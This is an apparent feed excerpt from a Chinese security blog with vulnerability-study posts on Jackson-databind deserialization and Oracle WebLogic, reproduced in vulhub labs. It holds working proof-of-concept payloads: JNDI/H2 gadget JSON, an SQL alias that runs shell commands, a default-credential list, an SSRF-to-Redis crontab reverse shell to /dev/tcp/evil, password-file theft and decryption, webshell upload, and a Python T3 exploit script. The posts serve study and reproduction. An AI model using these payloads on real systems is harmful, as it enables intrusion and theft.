class="string">"[\"org.apache.tomcat.dbcp.dbcp.datasources.PerUserPoolDataSource\", &#123;\"dataSourceName\":\"ldap://127.0.0.1:1389/Exploit\"&#125;]"</span>;</span><br><span class="line">        Object obj = mapper.readValue(json, Object<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        mapper.writeValueAsString(obj);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Jackson-databind-SSRF-amp-RCE-CVE-2020-36189"><a href="#Jackson-databind-SSRF-amp-RCE-CVE-2020-36189" class="headerlink" title="Jackson-databind SSRF&amp;RCE(CVE-2020-36189)"></a>Jackson-databind SSRF&amp;RCE(CVE-2020-36189)</h1><p>影响范围   </p><ul><li>Jackson-databind &lt; 2.9.10.7</li></ul><p>利用条件   </p><ul><li>开启enableDefaultTyping()</li><li>使用了com.h2database\com.newrelic.agent.java第三方依赖库</li></ul><p>漏洞概述<br>com.newrelic.agent.deps.ch.qos.logback.core.db.DriverManagerConnectionSource类绕过了之前jackson-databind维护的黑名单类，并且JDK版本较低的话，可造成SSRF&amp;RCE。</p><p>漏洞复现<br>pom.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.fasterxml.jackson.core<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jackson-databind<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.9.10.7<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- https://mvnrepository.com/artifact/com.newrelic.agent.java/newrelic-agent --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.newrelic.agent.java<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>newrelic-agent<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.9.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- https://mvnrepository.com/artifact/com.h2database/h2 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.h2database<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>h2<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.4.199<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.slf4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>slf4j-nop<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.7.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- https://mvnrepository.com/artifact/javax.transaction/jta --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.transaction<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jta<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure><p>SSRF   </p><p>POC  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;</span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.SerializationFeature;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Poc</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ObjectMapper mapper = <span class="keyword">new</span> ObjectMapper();</span><br><span class="line">        mapper.enableDefaultTyping();</span><br><span class="line">        mapper.configure(SerializationFeature.FAIL_ON_EMPTY_BEANS, <span class="keyword">false</span>);</span><br><span class="line">        String json = <span class="string">"[\"com.newrelic.agent.deps.ch.qos.logback.core.db.DriverManagerConnectionSource\", &#123;\"url\":\"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://pxrrvz.dnslog.cn/'\"&#125;]"</span>;</span><br><span class="line">        Object obj = mapper.readValue(json, Object<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        mapper.writeValueAsString(obj);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>RCE </p><p>web服务放入 exec.sql文件<br>exec.sql</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">ALIAS</span> SHELLEXEC <span class="keyword">AS</span> $$ <span class="keyword">String</span> shellexec(<span class="keyword">String</span> cmd) throws java.io.IOException &#123;</span><br><span class="line">        java.util.Scanner s = <span class="keyword">new</span> java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(<span class="string">"\\A"</span>);</span><br><span class="line">        return s.hasNext() ? s.next() : "";  &#125;</span><br><span class="line">$$;</span><br><span class="line"><span class="keyword">CALL</span> SHELLEXEC(<span class="string">'calc.exe'</span>)</span><br></pre></td></tr></table></figure><p>poc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Poc</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ObjectMapper mapper = <span class="keyword">new</span> ObjectMapper();</span><br><span class="line">        mapper.enableDefaultTyping();</span><br><span class="line">        mapper.configure(SerializationFeature.FAIL_ON_EMPTY_BEANS, <span class="keyword">false</span>);</span><br><span class="line">        String json = <span class="string">"[\"com.newrelic.agent.deps.ch.qos.logback.core.db.DriverManagerConnectionSource\", &#123;\"url\":\"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://127.0.0.1:4444/exec.sql'\"&#125;]"</span>;</span><br><span class="line">        Object obj = mapper.readValue(json, Object<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        mapper.writeValueAsString(obj);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Jackson-databind-SSRF"><a href="#Jackson-databind-SSRF" class="headerlink" title="Jackson-databind SSRF"></a>Jackson-databind SSRF</h1><p>影响范围  </p><ul><li>jackson-databind before 2.9.10.3</li><li>jackson-databind before 2.10.2</li></ul><p>利用条件</p><ul><li>开启enableDefaultTyping()</li></ul><p>漏洞概述<br>漏洞类javax.swing.JEditorPane来源于JDK不需要依赖任何jar包，该类在jackson-databind进行反序列化时可造成SSRF<br><a href="https://xz.aliyun.com/t/8011" target="_blank" rel="noopener">Jackson-databind SSRF浅析</a>  </p><h1 id="官方新规"><a href="#官方新规" class="headerlink" title="官方新规"></a>官方新规</h1><p>2020年12月30号，Jackson-databind官方表明由于之前对于黑名单更新的补丁过于频繁而且有大量的绕过是的版本的更新迭代过于频繁，加上申请CVE的流程使得整个维护变得更加繁琐，所以决定从2020年12月31号发布最后一个2.9.10.8版本之后将不再对此黑名单进行维护(除非有极其严重的问题发生)，同时也不再给相关白帽子申请相关CVE编号，但是会继续接受有关Jackson-databind的黑名单类相关安全报告，更多细节可以参考以下连接：</p><p><a href="https://github.com/FasterXML/jackson/wiki/Jackson-Polymorphic-Deserialization-CVE-Criteria" target="_blank" rel="noopener">https://github.com/FasterXML/jackson/wiki/Jackson-Polymorphic-Deserialization-CVE-Criteria</a></p><p>参考文章：</p><p><a href="https://vulhub.org/#/environments/jackson/CVE-2017-7525/" target="_blank" rel="noopener">https://vulhub.org/#/environments/jackson/CVE-2017-7525/</a><br><a href="https://patrilic.top/2020/03/24/Jackson-databind%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%20(CVE-2020-8840)/" target="_blank" rel="noopener">https://patrilic.top/2020/03/24/Jackson-databind%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%20(CVE-2020-8840)/</a><br><a href="https://xz.aliyun.com/t/8012" target="_blank" rel="noopener">Jackson-databind的几个CVE</a><br><a href="http://www.lmxspace.com/2019/07/30/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B1%87%E6%80%BB/" target="_blank" rel="noopener">Jackson 反序列化汇总</a><br><a href="http://pirogue.org/2018/01/12/jackson-databind-rce/" target="_blank" rel="noopener">Jackson反序列化远程代码执行漏洞</a><br><a href="https://xz.aliyun.com/t/8012" target="_blank" rel="noopener">Jackson-databind的几个CVE</a><br><a href="https://xz.aliyun.com/t/7820" target="_blank" rel="noopener">Jackson JDOM XSLTransformer Gadget浅析</a><br><a href="https://xz.aliyun.com/t/9331" target="_blank" rel="noopener">Jackson-databind漏洞两则分析</a><br><a href="https://xz.aliyun.com/t/8011" target="_blank" rel="noopener">Jackson-databind SSRF浅析</a></p><p>Jackson-databind 反序列化漏洞分析 (CVE-2020-8840): <a href="https://patrilic.top/2020/03/24/Jackson-databind%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%20(CVE-2020-8840)/#CVE-2020-8840" target="_blank" rel="noopener">https://patrilic.top/2020/03/24/Jackson-databind%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%20(CVE-2020-8840)/#CVE-2020-8840</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Jackson是一款当下流行的json解释器，主要负责处理Json的序列化和反序列化。&lt;/p&gt;
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>Weblogic 漏洞学习</title>
    <link href="https://blog.cfyqy.com/article/db67dfce.html"/>
    <id>https://blog.cfyqy.com/article/db67dfce.html</id>
    <published>2021-03-31T15:11:56.000Z</published>
    <updated>2021-04-13T16:15:32.547Z</updated>
    
    <content type="html"><![CDATA[<p>WebLogic是美国Oracle公司出品的一个application server，确切的说是一个基于JAVA EE架构的中间件，WebLogic是用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器。将Java的动态功能和Java Enterprise标准的安全性引入大型网络应用的开发、集成、部署和管理之中。</p><a id="more"></a><p><img src="../../images/java/weblogic/1.png" alt=""></p><h1 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h1><p>默认端口：7001 、7002  </p><p>常见默认口令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">用户名：system          密码：password</span><br><span class="line">用户名：weblogic       密码：weblogic </span><br><span class="line">用户名：admin           密码：security</span><br><span class="line">用户名：portadmin     密码：portadmin</span><br><span class="line">用户名：joe                密码：password</span><br><span class="line">用户名：mary             密码：password</span><br><span class="line">用户名：system          密码：security</span><br><span class="line">用户名：system          密码：system</span><br><span class="line">用户名：wlcsystem      密码：wlcsystem</span><br><span class="line">用户名：wlpisystem     密码：wlpisystem</span><br><span class="line">用户名：guest             密码：guest</span><br></pre></td></tr></table></figure><p>常见的Weblogic版本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">WebLogic Server 14c(14.1.1.0.0)-2020年4月3日</span><br><span class="line">WebLogic Server 12c(12.1.1) - 2012年3月6日</span><br><span class="line">WebLogic Server 12c(12.0) - 2011年12月1日</span><br><span class="line">WebLogic Server 11gR1 PS5 (10.3.6) - 2012年2月23日</span><br><span class="line">WebLogic Server 11gR1 PS4 (10.3.5) - 2011年5月6日</span><br><span class="line">WebLogic Server 11gR1 PS3 (10.3.4) - 2011年1月15日</span><br><span class="line">WebLogic Server 11gR1 PS2 (10.3.3) - 2010年四月</span><br><span class="line">WebLogic Server 11gR1 PS1 (10.3.2) - 2009年11月</span><br><span class="line">WebLogic Server 11g (10.3.1) - 2009年7月</span><br><span class="line">WebLogic Server 10.3 - 2008年8月（J2EE6支持）</span><br><span class="line">WebLogic Server 10.0 - 2007年3月（J2EE5支持）</span><br><span class="line">WebLogic Server 9.2.4 - 2010年7月22（主要提升管理和运行管理的功能）</span><br><span class="line">WebLogic Server 9.1</span><br><span class="line">WebLogic Server 9.0 - 【Diablo】 2006年11月</span><br><span class="line">WebLogic Server 8.1 －2003年7月发行到2004年8月为成熟版本，也已不再支持</span><br><span class="line">WebLogic Server 7.0 －2002年6月发行但是BEA公司推荐放弃使用。</span><br><span class="line">WebLogic Server 6.1 - 从November 2006不再支持</span><br><span class="line">WebLogic Server 6.0 - 2001年3月,从April 2003不再支持</span><br><span class="line">WebLogic Server 5.1 - (代码名: Denali) 第一个支持热部署技术的版本(通过命令行)</span><br><span class="line">WebLogic Server 4.0 - 1999年</span><br><span class="line">WebLogic Tengah 3.1 - 1998年6月</span><br><span class="line">WebLogic Tengah 3.0.1 - 1998年3月</span><br><span class="line">WebLogic Tengah 3.0 - 1998年1月</span><br><span class="line">WebLogic Tengah - 1997年11月</span><br></pre></td></tr></table></figure><h1 id="SSRF-CVE-2014-4210"><a href="#SSRF-CVE-2014-4210" class="headerlink" title="SSRF(CVE-2014-4210)"></a>SSRF(CVE-2014-4210)</h1><p>漏洞描述：Oracle融合中间件10.0.2.0和10.3.6.0中Oracle WebLogic Server组件中未指定的漏洞允许远程攻击者通过与WLS-Web服务相关的向量影响机密性。</p><p>影响版本：10.0.2.0、10.3.6.0  </p><p>SSRF漏洞测试<br>SSRF漏洞存在于 <a href="http://your-ip:7001/uddiexplorer/SearchPublicRegistries.jsp，" target="_blank" rel="noopener">http://your-ip:7001/uddiexplorer/SearchPublicRegistries.jsp，</a>  我们在brupsuite下测试该漏洞。访问一个可以访问的IP:PORT，如<a href="http://127.0.0.1:80：">http://127.0.0.1:80：</a>   </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">GET /uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search&amp;operator=http://127.0.0.1:7001 HTTP/1.1</span><br><span class="line">Host: localhost</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure><p>可访问的端口将会得到错误，一般是返回status code（如下图），如果访问的非http协议，则会返回did not have a valid SOAP content-type。<br><img src="../../images/java/weblogic/7.png" alt=""><br>修改为一个不存在的端口，将会返回could not connect over HTTP to server。<br><img src="../../images/java/weblogic/8.png" alt=""></p><p>通过错误的不同，即可探测内网状态  </p><p>注入HTTP头，利用Redis反弹shell<br>Weblogic的SSRF有一个比较大的特点，其虽然是一个“GET”请求，但是我们可以通过传入%0a%0d来注入换行符，而某些服务（如redis）是通过换行符来分隔每条命令，也就说我们可以通过该SSRF攻击内网中的redis服务器。</p><p>首先，通过ssrf探测内网中的redis服务器（docker环境的网段一般是<code>172.*</code>），发现172.28.0.2:6379可以连通<br>发送三条redis命令，将弹shell脚本写入/etc/crontab：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> 1 <span class="string">"\n\n\n\n0-59 0-23 1-31 1-12 0-6 root bash -c 'sh -i &gt;&amp; /dev/tcp/evil/21 0&gt;&amp;1'\n\n\n\n"</span></span><br><span class="line">config <span class="built_in">set</span> dir /etc/</span><br><span class="line">config <span class="built_in">set</span> dbfilename crontab</span><br><span class="line">save</span><br></pre></td></tr></table></figure><p>进行URL编码<br><img src="../../images/java/weblogic/9.png" alt=""><br>注意，换行符是“\r\n”，也就是“%0D%0A”。</p><p>将url编码后的字符串放在ssrf的域名后面，发送：<br><img src="../../images/java/weblogic/10.png" alt=""><br>成功反弹shell<br><img src="../../images/java/weblogic/11.png" alt="">  </p><h1 id="任意文件读取漏洞"><a href="#任意文件读取漏洞" class="headerlink" title="任意文件读取漏洞"></a>任意文件读取漏洞</h1><p>弱口令<br>环境启动后，访问<a href="http://your-ip:7001/console，即为weblogic后台。" target="_blank" rel="noopener">http://your-ip:7001/console，即为weblogic后台。</a></p><p>本环境存在弱口令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">weblogic</span><br><span class="line">Oracle@123</span><br></pre></td></tr></table></figure><p>任意文件读取漏洞的利用<br>假设不存在弱口令，如何对weblogic进行渗透？</p><p>本环境前台模拟了一个任意文件下载漏洞，访问<a href="http://your-ip:7001/hello/file.jsp?path=/etc/passwd可见成功读取passwd文件。那么，该漏洞如何利用？" target="_blank" rel="noopener">http://your-ip:7001/hello/file.jsp?path=/etc/passwd可见成功读取passwd文件。那么，该漏洞如何利用？</a>   </p><p>读取后台用户密文与密钥文件<br>weblogic密码使用AES（老版本3DES）加密，对称加密可解密，只需要找到用户的密文与加密时的密钥即可。这两个文件均位于base_domain下，名为SerializedSystemIni.dat和config.xml，在本环境中为./security/SerializedSystemIni.dat和./config/config.xml（基于当前目录/root/Oracle/Middleware/user_projects/domains/base_domain）。   </p><p>SerializedSystemIni.dat是一个二进制文件，所以一定要用burpsuite来读取，用浏览器直接下载可能引入一些干扰字符。在burp里选中读取到的那一串乱码，右键copy to file就可以保存成一个文件： </p><p><img src="../../images/java/weblogic/12.png" alt=""><br>config.xml是base_domain的全局配置文件，所以乱七八糟的内容比较多，找到其中的<node-manager-password-encrypted>的值，即为加密后的管理员密码，不要找错了：  </p><p><img src="../../images/java/weblogic/13.png" alt="">  </p><p>解密密文<br>然后使用本环境的decrypt目录下的weblogic_decrypt.jar，解密密文（或者参考这篇文章：<a href="http://cb.drops.wiki/drops/tips-349.html" target="_blank" rel="noopener">http://cb.drops.wiki/drops/tips-349.html</a> ，自己编译一个解密的工具）：<br>ps: 一开始bp的字体为宋体没解密成功，后面改为黑体解密成功了？<br><img src="../../images/java/weblogic/14.png" alt="">  </p><p>可见，解密后和我预设的密码一致，说明成功。</p><p>后台上传webshell<br>获取到管理员密码后，登录后台。点击左侧的部署，可见一个应用列表：<br><img src="../../images/java/weblogic/15.png" alt=""> </p><p>点击安装，选择“上载文件”：  </p><p><img src="../../images/java/weblogic/16.png" alt=""><br>上传war包。值得注意的是，我们平时tomcat用的war包不一定能够成功，你可以将你的webshell放到本项目的web/hello.war这个压缩包中，再上传。上传成功后点下一步。</p><p>填写应用名称：<br><img src="../../images/java/weblogic/17.png" alt=""><br>继续一直下一步，最后点完成。</p><p>应用目录在war包中WEB-INF/weblogic.xml里指定（因为本测试环境已经使用了/hello这个目录，所以你要在本测试环境下部署shell，需要修改这个目录，比如修改成/jspspy）：<br><img src="../../images/java/weblogic/18.png" alt=""><br>成功获取webshell：<br><img src="../../images/java/weblogic/19.png" alt="">   </p><h1 id="CVE-2015-4852"><a href="#CVE-2015-4852" class="headerlink" title="CVE-2015-4852"></a>CVE-2015-4852</h1><p>漏洞描述：Oracle WebLogic Server 10.3.6.0、12.1.2.0、12.1.3.0和12.2.1.0中的WLS安全组件允许远程攻击者在与oracle_common/modules/com.bea.core.apache.commons.collections.jar.相关的T3协议流量中通过精心编制的序列化Java对象执行任意命令。注意：此CVE的范围仅限于WebLogicServer产品</p><p>影响版本：10.3.6.0、12.1.2.0、12.1.3.0和12.2.1.0</p><p>参考文章：<a href="https://mp.weixin.qq.com/s?__biz=MzI0NzEwOTM0MA==&mid=2652482299&idx=1&sn=b045360e713bfc80ac6620c03047e690" target="_blank" rel="noopener">WebLogic系列漏洞学习之T3：CVE-2015-4852</a>   </p><p>漏洞环境  </p><p>Dockerfile</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">FROM vulhub&#x2F;weblogic  </span><br><span class="line">ENV debugFlag true  </span><br><span class="line">EXPOSE 7001  </span><br><span class="line">EXPOSE 8453</span><br></pre></td></tr></table></figure><p>docker-compose.yml</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">version: &#39;2&#39;</span><br><span class="line">services:</span><br><span class="line"> weblogic:</span><br><span class="line">    build: .</span><br><span class="line">    ports:</span><br><span class="line">      - &quot;7001:7001&quot;</span><br><span class="line">      - &quot;8453:8453&quot;</span><br></pre></td></tr></table></figure><p>docker-compose up -d   </p><p>漏洞复现<br>先生成反序列化文件 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial-0.0.6-SNAPSHOT-all.jar  CommonsCollections1 &quot;touch &#x2F;tmp&#x2F;success&quot; &gt; poc.ser</span><br></pre></td></tr></table></figure><p>T3利用脚本 exp.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">(ip, port, file)</span>:</span></span><br><span class="line">    t3_header = <span class="string">'t3 10.3.6\nAS:255\nHL:19\n\n'</span></span><br><span class="line">    host = (ip, int(port))</span><br><span class="line">    <span class="comment"># socket connect</span></span><br><span class="line">    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    sock.settimeout(<span class="number">15</span>)</span><br><span class="line">    sock.connect(host)</span><br><span class="line">    <span class="comment"># send t3 header</span></span><br><span class="line">    sock.send(t3_header.encode(<span class="string">'utf-8'</span>))</span><br><span class="line">    <span class="comment"># time.sleep(1)</span></span><br><span class="line">    resp1 = sock.recv(<span class="number">1024</span>)</span><br><span class="line">    <span class="comment"># first part</span></span><br><span class="line">    data1 = <span class="string">'016501ffffffffffffffff000000690000ea60000000184e1cac5d00dbae7b5fb5f04d7a1678d3b7d14d11bf136d67027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006fe010000'</span></span><br><span class="line">    <span class="comment"># second part, BIN -&gt; HEX</span></span><br><span class="line">    <span class="keyword">with</span> open(file, <span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        payload = binascii.b2a_hex(f.read()).decode(<span class="string">'utf-8'</span>)</span><br><span class="line">    <span class="comment"># join</span></span><br><span class="line">    data = data1 + payload</span><br><span class="line">    <span class="comment"># get lenth and join</span></span><br><span class="line">    data = <span class="string">'%s%s'</span> % (<span class="string">'&#123;:08x&#125;'</span>.format(len(data) // <span class="number">2</span> + <span class="number">4</span>), data)</span><br><span class="line">    <span class="comment"># a2b: HEX -&gt; BIN</span></span><br><span class="line">    sock.send(binascii.a2b_hex(data))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    exp(<span class="string">'192.168.1.103'</span>,<span class="string">'7001'</span>,<span class="string">'D:\security\penetration\漏洞利用\java\weblogic\CVE-2015-4852\poc.ser'</span>)</span><br></pre></td></tr></table></figure><p>远程调试</p><p>搭建环境复现的时候我们已经对容器开去了远程调试服务，下面只需要对本地IDEA环境进行部署。</p><p>首先从容器拷贝root目录，然后单独将相关的jar包拷贝出来</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker cp 容器id:&#x2F;root .</span><br><span class="line">mkdir jar_lib</span><br><span class="line">find .&#x2F; -name *.jar -exec cp &#123;&#125; jar_lib&#x2F; \;</span><br></pre></td></tr></table></figure><p>将上述 jar_lib 和 root 放到本地，然后用 IDEA 打开 root/Oracle/Middleware/wlserver_10.3，File-&gt;project Structure 将jar_lib加入libraries<br><img src="../../images/java/weblogic/23.png" alt=""><br>选择weblogic自带的jdk root/jdk/jdk1.6.0_45<br><img src="../../images/java/weblogic/25.png" alt=""><br>添加远程JVM<br><img src="../../images/java/weblogic/24.png" alt=""><br>在wlthint3client.jar:weblogic.rjvm.InboundMsgAbbrev:24行打断点<br><img src="../../images/java/weblogic/26.png" alt=""></p><p>详细分析可看此文章 